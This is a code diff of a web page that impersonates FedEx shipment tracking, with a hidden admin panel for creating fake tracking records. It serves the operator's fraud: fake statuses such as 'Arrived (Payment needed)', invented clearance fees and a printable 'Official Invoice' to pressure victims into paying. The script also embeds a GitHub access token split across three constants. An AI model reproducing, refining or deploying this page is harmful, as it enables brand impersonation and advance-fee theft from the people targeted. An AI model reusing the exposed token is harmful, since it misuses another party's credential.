@@ -3,33 +3,32 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fedex | Express Tracking</title>
+    <title>Fedex | Global Tracking</title>
     <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
     <style>
-        :root { --p: #4D148C; --o: #FF6200; --bg: #f4f4f7; }
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; background: var(--bg); color: #333; }
-        .nav { background: var(--p); padding: 15px; color: white; display: flex; justify-content: space-between; align-items: center; position: sticky; top:0; z-index:100; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        :root { --p: #4D148C; --o: #FF6200; --bg: #f8f9fa; }
+        body { font-family: -apple-system, system-ui, sans-serif; margin: 0; background: var(--bg); color: #333; }
+        .nav { background: var(--p); padding: 15px; color: white; display: flex; justify-content: space-between; align-items: center; position: sticky; top:0; z-index:999; }
         .logo { font-size: 24px; font-weight: 900; cursor: pointer; user-select: none; }
-        .wrapper { padding: 15px; max-width: 480px; margin: auto; min-height: 90vh; }
-        .card { background: white; border-radius: 15px; padding: 25px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); margin-top: 20px; }
-        input, select { width: 100%; padding: 14px; margin: 10px 0; border: 1.5px solid #eee; border-radius: 8px; box-sizing: border-box; font-size: 16px; outline: none; }
-        input:focus { border-color: var(--o); }
-        .btn { width: 100%; padding: 15px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.3s; }
-        .btn-o { background: var(--o); color: white; }
-        .btn-o:active { transform: scale(0.98); opacity: 0.9; }
+        .wrapper { padding: 15px; max-width: 480px; margin: auto; }
+        .card { background: white; border-radius: 12px; padding: 25px; box-shadow: 0 5px 15px rgba(0,0,0,0.08); margin-top: 20px; }
+        input, select { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 16px; }
+        .btn { width: 100%; padding: 15px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.2s; }
+        .btn-o { background: var(--o); color: white; margin-top: 10px; }
         
-        #admin-panel { display: none; background: #1a1a1a; color: white; padding: 20px; border-radius: 15px; margin-top: 20px; border: 2px solid var(--o); }
-        #admin-panel input { background: #2a2a2a; color: white; border: 1px solid #444; }
+        /* Admin View */
+        #admin-panel { display: none; background: #222; color: white; padding: 20px; border-radius: 12px; margin-top: 20px; }
+        #admin-panel input, #admin-panel select { background: #333; color: white; border: 1px solid #444; }
 
-        #result { display: none; margin-top: 20px; text-align: left; animation: fadeIn 0.5s; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        /* Results */
+        #result { display: none; margin-top: 20px; border-top: 1px solid #eee; padding-top: 15px; }
+        .status-box { padding: 10px; border-radius: 5px; text-align: center; font-weight: bold; margin-bottom: 15px; }
+        .row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #f9f9f9; font-size: 14px; }
+        .pkg-img { width: 100%; border-radius: 8px; margin-top: 15px; display: none; }
         
-        .status-bar { padding: 12px; border-radius: 8px; text-align: center; font-weight: bold; margin-bottom: 15px; text-transform: uppercase; letter-spacing: 1px; }
-        .row { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #f0f0f0; font-size: 14px; }
-        .pkg-img { width: 100%; border-radius: 12px; margin-top: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); display: none; }
-        
-        @media print { .nav, .wrapper, .btn, #admin-panel, .card { display: none !important; } #invoice { display: block !important; } }
-        #invoice { display: none; padding: 40px; border: 2px solid #333; font-family: Arial; }
+        #pay-box { display: none; margin-top: 15px; padding: 15px; background: #fff3cd; border-radius: 8px; color: #856404; }
+        @media print { body * { visibility: hidden; } #invoice, #invoice * { visibility: visible; } #invoice { position: absolute; left: 0; top: 0; width: 100%; display: block !important; } }
+        #invoice { display: none; padding: 30px; border: 1px solid #000; }
     </style>
 </head>
 <body>
@@ -37,65 +36,68 @@
 <div id="google_translate_element" style="display:none"></div>
 
 <div class="nav">
-    <div class="logo" onclick="checkAdmin()">Fed<span style="color:var(--o)">ex</span></div>
-    <div style="font-size:11px; opacity: 0.8;">Secure Tracking</div>
+    <div class="logo" onclick="openAdmin()">Fed<span style="color:var(--o)">ex</span></div>
+    <div style="font-size:11px">Secure Global Portal</div>
 </div>
 
 <div class="wrapper">
     <div class="card" id="client-view">
-        <h2 style="margin: 0 0 20px 0; color:var(--p); font-size: 20px;">Track Shipment</h2>
-        <input type="text" id="trackInput" placeholder="Enter Tracking Number">
-        <button class="btn btn-o" onclick="startTracking()">TRACK PACKAGE</button>
+        <h2 style="margin:0 0 15px 0; color:var(--p)">Track Shipment</h2>
+        <input type="text" id="trackInput" placeholder="Enter Tracking Code">
+        <button class="btn btn-o" onclick="startTracking()">TRACK</button>
 
         <div id="result">
-            <div id="st-badge" class="status-bar"></div>
+            <div id="st-badge" class="status-box"></div>
             <div class="row"><span>Recipient:</span> <b id="r-name"></b></div>
-            <div class="row"><span>Route:</span> <b id="r-route"></b></div>
-            <div class="row"><span>Scheduled:</span> <b id="r-eta"></b></div>
+            <div class="row"><span>Origin:</span> <b id="r-origin"></b></div>
+            <div class="row"><span>Destination:</span> <b id="r-dest"></b></div>
+            <div class="row"><span>Departure Time:</span> <b id="r-takeoff"></b></div>
+            <div class="row"><span>Estimated Arrival:</span> <b id="r-reach"></b></div>
+            <div class="row"><span>Last Update:</span> <b id="r-date"></b></div>
             <img id="r-img" class="pkg-img">
             
-            <div id="pay-box" style="display:none; margin-top:20px; padding:20px; background:#fff3cd; border-radius:10px; color:#856404; border-left: 5px solid #ffc107;">
-                <p style="margin:0 0 15px 0;"><b>Clearance Required:</b> A processing fee of $<span id="r-fee"></span> is needed for final release.</p>
-                <button class="btn" style="background:#333; color:white;" onclick="window.print()">DOWNLOAD INVOICE</button>
+            <div id="pay-box">
+                <p><b>Note:</b> Arrival Status reached. A fee of <b>$<span id="r-fee"></span></b> is required for clearance.</p>
+                <button class="btn" style="background:#333; color:white;" onclick="window.print()">Download Invoice</button>
             </div>
         </div>
     </div>
 
     <div id="admin-panel">
-        <h3 style="color:var(--o); margin-top:0;">Admin Control</h3>
-        <input type="text" id="a-code" placeholder="New Tracking ID">
-        <input type="text" id="a-name" placeholder="Client Full Name">
-        <input type="text" id="a-origin" placeholder="Origin City">
+        <h3 style="color:var(--o)">Admin Dashboard</h3>
+        <input type="text" id="a-code" placeholder="Tracking Code">
+        <input type="text" id="a-name" placeholder="Person Name">
+        <input type="text" id="a-origin" placeholder="Original City">
         <input type="text" id="a-dest" placeholder="Destination City">
-        <input type="text" id="a-eta" placeholder="Est. Arrival Date">
-        <input type="number" id="a-fee" placeholder="Customs Fee (Amount)">
+        <input type="text" id="a-takeoff" placeholder="Time way e go take off">
+        <input type="text" id="a-reach" placeholder="Time way e go take reach">
+        <input type="number" id="a-fee" placeholder="Fee Amount">
+        
         <select id="a-status">
+            <option value="Loading">Loading</option>
+            <option value="Pending">Pending</option>
             <option value="In Transit">In Transit</option>
             <option value="Hold">Hold</option>
             <option value="Held at Customs">Held at Customs</option>
             <option value="Arrived (Payment needed)">Arrived (Payment needed)</option>
         </select>
-        <p style="font-size:12px; margin-bottom:5px;">Select Package Photo:</p>
+
+        <p style="font-size:12px">Upload Package Photo:</p>
         <input type="file" id="a-file" accept="image/*">
-        <button class="btn btn-o" id="saveBtn" onclick="uploadData()">SAVE & PUSH TO CLOUD</button>
-        <button class="btn" style="background:#444; color:white; margin-top:10px;" onclick="location.reload()">LOGOUT</button>
+        
+        <button class="btn btn-o" id="saveBtn" onclick="saveToCloud()">SAVE TO CLOUD</button>
+        <button class="btn" style="margin-top:10px; background:#444; color:white;" onclick="location.reload()">LOGOUT</button>
     </div>
 </div>
 
 <div id="invoice">
-    <div style="display:flex; justify-content:space-between; align-items:center;">
-        <h1 style="color:#4D148C; margin:0;">Fedex Express</h1>
-        <h2 style="margin:0; color:#666;">INVOICE</h2>
-    </div>
-    <hr style="margin: 20px 0;">
-    <p><b>Tracking ID:</b> <span id="inv-code"></span></p>
+    <h1 style="color:#4D148C">Fedex Express Official Invoice</h1>
+    <hr>
+    <p><b>Tracking Code:</b> <span id="inv-code"></span></p>
     <p><b>Consignee:</b> <span id="inv-name"></span></p>
-    <p><b>Payment Due:</b> $<span id="inv-fee"></span></p>
-    <p><b>Service:</b> Priority Overnight International</p>
-    <p><b>Issue Date:</b> <span id="inv-date"></span></p>
-    <div style="margin-top: 100px; border-top: 1px dashed #ccc; padding-top: 10px;">
-        <p style="font-size: 12px; text-align: center;">Official Fedex Shipment Document. All rights reserved 2026.</p>
-    </div>
+    <p><b>Clearance Fee:</b> $<span id="inv-fee"></span></p>
+    <p><b>Date:</b> <span id="inv-date"></span></p>
+    <div style="margin-top:50px; border-top:1px solid #eee; font-size:12px;">Generated by Fedex Global Systems.</div>
 </div>
 
 <script>
@@ -103,16 +105,17 @@
         new google.translate.TranslateElement({pageLanguage: 'en'}, 'google_translate_element');
     }
 
-    const ACC = "fedex-codetracking"; // Your Username
-    const LIB = "fedex-codetracking"; // Your Repo
-    const T1 = "ghp_GPObdZF1wa"; 
-    const T2 = "NFIHXvzyspe2zsce"; 
-    const T3 = "Ilrq0ZpR57";
-    const G_KEY = T1 + T2 + T3;
+    // AUTH & REPO CONFIG
+    const U = "fedex-codetracking";
+    const R = "fedex-codetracking";
+    const P1 = "ghp_GPObdZF1wa"; 
+    const P2 = "NFIHXvzyspe2zsce"; 
+    const P3 = "Ilrq0ZpR57";
+    const KEY = P1 + P2 + P3;
 
-    function checkAdmin() {
-        if(prompt("Admin Password:") === "0000") {
-            if(prompt("Admin Token:") === "0000") {
+    function openAdmin() {
+        if(prompt("Admin Password") === "0000") {
+            if(prompt("Admin Token") === "0000") {
                 document.getElementById('client-view').style.display = 'none';
                 document.getElementById('admin-panel').style.display = 'block';
             }
@@ -120,96 +123,98 @@
     }
 
     async function startTracking() {
-        const code = document.getElementById('trackInput').value;
-        try {
-            const res = await fetch(`https://raw.githubusercontent.com/${ACC}/${LIB}/main/data.json?nocache=${Date.now()}`);
-            const data = await res.json();
-            const s = data[code];
-
-            if(s) {
-                document.getElementById('result').style.display = 'block';
-                const badge = document.getElementById('st-badge');
-                badge.innerText = s.status;
-                badge.style.background = s.status.includes("Arrived") ? "#d4edda" : "#e9ecef";
-                badge.style.color = s.status.includes("Arrived") ? "#155724" : "#495057";
-                
-                document.getElementById('r-name').innerText = s.name;
-                document.getElementById('r-route').innerText = `${s.origin} → ${s.dest}`;
-                document.getElementById('r-eta').innerText = s.eta;
-                
-                if(s.img) {
-                    const img = document.getElementById('r-img');
-                    img.src = s.img;
-                    img.style.display = 'block';
-                }
-
-                if(s.status.includes("Arrived")) {
-                    document.getElementById('pay-box').style.display = 'block';
-                    document.getElementById('r-fee').innerText = s.fee;
-                    document.getElementById('inv-code').innerText = code;
-                    document.getElementById('inv-name').innerText = s.name;
-                    document.getElementById('inv-fee').innerText = s.fee;
-                    document.getElementById('inv-date').innerText = new Date().toLocaleDateString();
-                }
-            } else { alert("Tracking ID not found in system."); }
-        } catch(e) { alert("Error connecting to database. Make sure data.json exists."); }
-    }
-
-    function toBase64(file) {
-        return new Promise((resolve, reject) => {
-            const reader = new FileReader();
-            reader.readAsDataURL(file);
-            reader.onload = () => resolve(reader.result);
-            reader.onerror = e => reject(e);
+        const input = document.getElementById('trackInput').value;
+        const res = await fetch(`https://api.github.com/repos/${U}/${R}/contents/data.json?v=${Date.now()}`, {
+            headers: { "Authorization": `token ${KEY}` }
         });
+        
+        if(!res.ok) { alert("No shipments found yet. Admin must save first."); return; }
+        
+        const file = await res.json();
+        const data = JSON.parse(atob(file.content));
+        const s = data[input];
+
+        if(s) {
+            document.getElementById('result').style.display = 'block';
+            document.getElementById('st-badge').innerText = s.status;
+            document.getElementById('st-badge').style.background = s.status.includes("Arrived") ? "#d4edda" : "#e9ecef";
+            document.getElementById('r-name').innerText = s.name;
+            document.getElementById('r-origin').innerText = s.origin;
+            document.getElementById('r-dest').innerText = s.dest;
+            document.getElementById('r-takeoff').innerText = s.off;
+            document.getElementById('r-reach').innerText = s.reach;
+            document.getElementById('r-date').innerText = s.date;
+            
+            if(s.img) {
+                const i = document.getElementById('r-img');
+                i.src = s.img;
+                i.style.display = 'block';
+            }
+
+            if(s.status.includes("Arrived")) {
+                document.getElementById('pay-box').style.display = 'block';
+                document.getElementById('r-fee').innerText = s.fee;
+                document.getElementById('inv-code').innerText = input;
+                document.getElementById('inv-name').innerText = s.name;
+                document.getElementById('inv-fee').innerText = s.fee;
+                document.getElementById('inv-date').innerText = s.date;
+            }
+        } else { alert("Tracking code not found."); }
     }
 
-    async function uploadData() {
+    async function saveToCloud() {
         const btn = document.getElementById('saveBtn');
-        btn.innerText = "UPLOADING...";
-        btn.disabled = true;
+        btn.innerText = "SAVING..."; btn.disabled = true;
 
         const id = document.getElementById('a-code').value;
-        const fileInput = document.getElementById('a-file');
+        const fileInput = document.getElementById('a-file').files[0];
         let imgBase64 = "";
-        
-        if(fileInput.files.length > 0) {
-            imgBase64 = await toBase64(fileInput.files[0]);
+
+        if(fileInput) {
+            const reader = new FileReader();
+            imgBase64 = await new Promise(r => {
+                reader.onload = () => r(reader.result);
+                reader.readAsDataURL(fileInput);
+            });
         }
 
         const payload = {
             name: document.getElementById('a-name').value,
             origin: document.getElementById('a-origin').value,
             dest: document.getElementById('a-dest').value,
-            eta: document.getElementById('a-eta').value,
-            status: document.getElementById('a-status').value,
+            off: document.getElementById('a-takeoff').value,
+            reach: document.getElementById('a-reach').value,
             fee: document.getElementById('a-fee').value,
+            status: document.getElementById('a-status').value,
             img: imgBase64,
-            updated: new Date().toLocaleString()
+            date: new Date().toLocaleString()
         };
 
-        try {
-            const url = `https://api.github.com/repos/${ACC}/${LIB}/contents/data.json`;
-            const getRes = await fetch(url);
-            const fileMeta = await getRes.json();
-            const db = JSON.parse(atob(fileMeta.content));
+        const url = `https://api.github.com/repos/${U}/${R}/contents/data.json`;
+        let currentDB = {};
+        let sha = null;
 
-            db[id] = payload;
+        const check = await fetch(url, { headers: { "Authorization": `token ${KEY}` } });
+        if(check.ok) {
+            const existing = await check.json();
+            currentDB = JSON.parse(atob(existing.content));
+            sha = existing.sha;
+        }
 
-            const pushRes = await fetch(url, {
-                method: "PUT",
-                headers: { "Authorization": `token ${G_KEY}`, "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    message: `Shipment ${id} updated`,
-                    content: btoa(unescape(encodeURIComponent(JSON.stringify(db, null, 2)))),
-                    sha: fileMeta.sha
-                })
-            });
+        currentDB[id] = payload;
 
-            if(pushRes.ok) { alert("Shipment successfully saved to Cloud!"); location.reload(); }
-            else { alert("Cloud update failed. Check your token/repo permissions."); }
-        } catch(e) { alert("Error: " + e.message); }
-        finally { btn.innerText = "SAVE & PUSH TO CLOUD"; btn.disabled = false; }
+        const push = await fetch(url, {
+            method: "PUT",
+            headers: { "Authorization": `token ${KEY}` },
+            body: JSON.stringify({
+                message: "Update Shipment " + id,
+                content: btoa(unescape(encodeURIComponent(JSON.stringify(currentDB, null, 2)))),
+                sha: sha
+            })
+        });
+
+        if(push.ok) { alert("Shipment Saved!"); location.reload(); }
+        else { alert("Error! Check your token or repo name."); }
     }
 </script>
 </body>
